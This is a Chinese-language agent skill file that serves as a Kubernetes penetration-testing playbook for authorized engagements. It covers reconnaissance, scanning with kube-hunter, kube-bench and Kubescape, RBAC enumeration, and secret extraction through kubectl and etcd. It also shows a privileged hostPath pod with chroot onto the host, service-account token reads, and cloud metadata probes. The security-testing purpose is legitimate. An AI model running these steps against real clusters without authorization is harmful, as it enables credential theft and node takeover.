---
name: performing-kubernetes-penetration-testing
description: Kubernetes 渗透测试（Penetration Testing）通过对 API server、kubelet、etcd、Pod、RBAC、网络策略和密钥模拟攻击者技术，系统性评估集群安全性。使用 kube-hunter、Kubescape、peirates 等工具识别可能导致集群被攻陷的错误配置。 Use when this capability is needed.
metadata:
  author: killvxk
---
# 执行 Kubernetes 渗透测试

## 概述

Kubernetes 渗透测试（Penetration Testing）通过对 API server、kubelet、etcd、Pod、RBAC、网络策略和密钥模拟攻击者技术，系统性评估集群安全性。使用 kube-hunter、Kubescape、peirates 和手动 kubectl 利用等工具，测试人员可识别可能导致集群被攻陷的错误配置。

## 前置条件

- 已授权的渗透测试委托
- Kubernetes 集群访问权限（不同测试场景需要不同级别的访问权限）
- 已安装 kube-hunter、kubescape、kube-bench
- 已配置 kubectl
- 网络可访问集群组件

## 核心概念

### Kubernetes 攻击面

| 组件 | 端口 | 攻击向量 |
|-----------|------|---------------|
| API Server | 6443 | 认证绕过、RBAC 滥用、匿名访问 |
| Kubelet | 10250/10255 | 未认证访问、命令执行 |
| etcd | 2379/2380 | 未认证读取、密钥提取 |
| Dashboard | 8443 | 默认凭据、令牌窃取 |
| NodePort 服务 | 30000-32767 | 服务暴露、应用漏洞利用 |
| CoreDNS | 53 | DNS 欺骗、区域传输 |

### MITRE ATT&CK Kubernetes 矩阵

| 阶段 | 技术 |
|-------|-----------|
| 初始访问（Initial Access） | 暴露的 Dashboard、Kubeconfig 窃取、应用漏洞利用 |
| 执行（Execution） | exec 进入容器、CronJob、部署特权 Pod |
| 持久化（Persistence） | 后门容器、变异 Webhook、静态 Pod |
| 权限提升（Privilege Escalation） | 特权容器、节点访问、RBAC 滥用 |
| 防御规避（Defense Evasion） | Pod 名称伪装、命名空间隐藏、日志删除 |
| 凭据访问（Credential Access） | 密钥提取、服务账户令牌窃取 |
| 横向移动（Lateral Movement） | 容器逃逸、集群内部服务 |

## 实施步骤

### 步骤 1：外部侦察

```bash
# 发现 Kubernetes 服务
nmap -sV -p 443,6443,8443,2379,10250,10255,30000-32767 target-cluster.com

# 检查暴露的 API server
curl -k https://target-cluster.com:6443/api
curl -k https://target-cluster.com:6443/version

# 检查匿名认证
curl -k https://target-cluster.com:6443/api/v1/namespaces

# 检查暴露的 kubelet
curl -k https://node-ip:10250/pods
curl http://node-ip:10255/pods  # 只读 kubelet
```

### 步骤 2：使用 kube-hunter 自动化扫描

```bash
# 安装 kube-hunter
pip install kube-hunter

# 远程扫描
kube-hunter --remote target-cluster.com

# 内部网络扫描（在集群内部运行）
kube-hunter --internal

# Pod 扫描（在 Pod 内部运行）
kube-hunter --pod

# 生成报告
kube-hunter --remote target-cluster.com --report json --log output.json
```

### 步骤 3：使用 kube-bench 进行 CIS Benchmark 评估

```bash
# 在 master 节点运行 kube-bench
kube-bench run --targets master

# 在工作节点运行
kube-bench run --targets node

# 检查特定章节
kube-bench run --targets master --check 1.2.1,1.2.2,1.2.3

# JSON 格式输出
kube-bench run --json > kube-bench-results.json

# 以 Kubernetes Job 方式运行
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs -l app=kube-bench
```

### 步骤 4：使用 Kubescape 进行框架合规检查

```bash
# 安装 kubescape
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

# 对照 NSA/CISA 加固指南扫描
kubescape scan framework nsa

# 对照 MITRE ATT&CK 扫描
kubescape scan framework mitre

# 对照 CIS Kubernetes Benchmark 扫描
kubescape scan framework cis-v1.23-t1.0.1

# 扫描特定命名空间
kubescape scan framework nsa --namespace production

# JSON 格式输出
kubescape scan framework nsa --format json --output kubescape-report.json
```

### 步骤 5：RBAC 利用测试

```bash
# 检查当前权限
kubectl auth can-i --list

# 检查特定高价值权限
kubectl auth can-i create pods
kubectl auth can-i create pods --subresource=exec
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings
kubectl auth can-i '*' '*'  # 检查 cluster-admin 权限

# 枚举服务账户令牌
kubectl get serviceaccounts -A
kubectl get secrets -A -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {name: .metadata.name, namespace: .metadata.namespace}'

# 检查过度授权的角色
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name=="system:anonymous" or .subjects[]?.name=="system:unauthenticated")'

# 测试服务账户模拟
kubectl --as=system:serviceaccount:default:default get pods
```

### 步骤 6：密钥提取测试

```bash
# 列出所有密钥
kubectl get secrets -A

# 提取特定密钥
kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d

# 检查环境变量中的密钥
kubectl get pods -A -o json | jq '.items[].spec.containers[].env[]? | select(.valueFrom.secretKeyRef)'

# 检查已挂载卷中的密钥
kubectl get pods -A -o json | jq '.items[].spec.volumes[]? | select(.secret)'

# 直接搜索 etcd（如果可访问）
ETCDCTL_API=3 etcdctl --endpoints=https://etcd-ip:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only
```

### 步骤 7：Pod 利用

```bash
# 部署具有提升权限的测试 Pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pentest-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: pentest
    image: ubuntu:22.04
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# exec 进入 Pod
kubectl exec -it pentest-pod -- bash

# 在特权 Pod 内部 - 访问宿主机文件系统
chroot /host

# 在任意 Pod 内部 - 检查内部服务
curl -k https://kubernetes.default.svc/api/v1/namespaces
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 步骤 8：网络策略测试

```bash
# 检查网络策略
kubectl get networkpolicies -A

# 测试 Pod 间通信（应被策略阻断）
kubectl run test-netpol --image=busybox --restart=Never -- wget -qO- --timeout=2 http://target-service.namespace.svc

# 测试对外部服务的出站访问
kubectl run test-egress --image=busybox --restart=Never -- wget -qO- --timeout=2 http://example.com

# 测试访问元数据服务（云环境）
kubectl run test-metadata --image=busybox --restart=Never -- wget -qO- --timeout=2 http://169.254.169.254/latest/meta-data/
```

## 验证命令

```bash
# 验证 kube-hunter 发现
kube-hunter --remote $CLUSTER_IP --report json

# 与 Kubescape 交叉验证
kubescape scan framework nsa --format json

# 检查修复效果
kube-bench run --targets master,node --json

# 清理渗透测试资源
kubectl delete pod pentest-pod
kubectl delete pod test-netpol test-egress test-metadata
```

## 参考资料

- [kube-hunter - Kubernetes 渗透测试](https://github.com/aquasecurity/kube-hunter)
- [Kubescape - Kubernetes 安全平台](https://github.com/kubescape/kubescape)
- [kube-bench - CIS Benchmark](https://github.com/aquasecurity/kube-bench)
- [MITRE ATT&CK 容器矩阵](https://attack.mitre.org/matrices/enterprise/containers/)
- [Kubernetes 威胁矩阵 - Microsoft](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/)

---
> Source: [killvxk/cybersecurity-skills-zh](https://github.com/killvxk/cybersecurity-skills-zh) — distributed by [TomeVault](https://tomevault.io).
<!-- tomevault:4.0:skill_md:2026-06-15 -->
